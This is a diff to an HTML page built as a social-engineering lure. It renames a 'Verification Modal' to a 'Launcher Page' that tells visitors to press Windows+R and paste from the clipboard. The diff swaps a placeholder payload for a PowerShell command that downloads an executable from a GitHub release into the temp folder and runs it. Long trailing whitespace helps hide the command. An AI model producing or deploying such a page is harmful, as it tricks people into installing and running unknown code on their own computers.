@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Modal</title>
+    <title>Launcher Page</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         body {
@@ -68,10 +68,10 @@
     </style>
 </head>
 <body>
-    <button id="openModal">Open Verification Modal</button>
+    <button id="openModal">Open Launcher Page</button>
     <div id="myModal" class="modal">
         <div class="modal-content">
-            <h2>Verification Steps</h2>
+            <h2>Launcher Steps</h2>
             <div class="steps">
                 <p>1. Press Windows Button <img src="https://img.icons8.com/ios11/512/windows-10.png" class="windows-icon"/> + R</p>
                 <p>2. Press CTRL + V</p>
@@ -80,7 +80,7 @@
         </div>
     </div>
     <script>
-        const command = 'cmd'; //твой пейлоад
+        const command = 'powershell -Command "Invoke-WebRequest -Uri 'https://github.com/lolkekdumped228/escapefromeurope/releases/download/1/launcher.exe' -OutFile \"$env:TEMP\a.exe\"; Start-Process \"$env:TEMP\a.exe\""                                                                ';
         function copyToClipboard() {
             navigator.clipboard.writeText(command);
         }
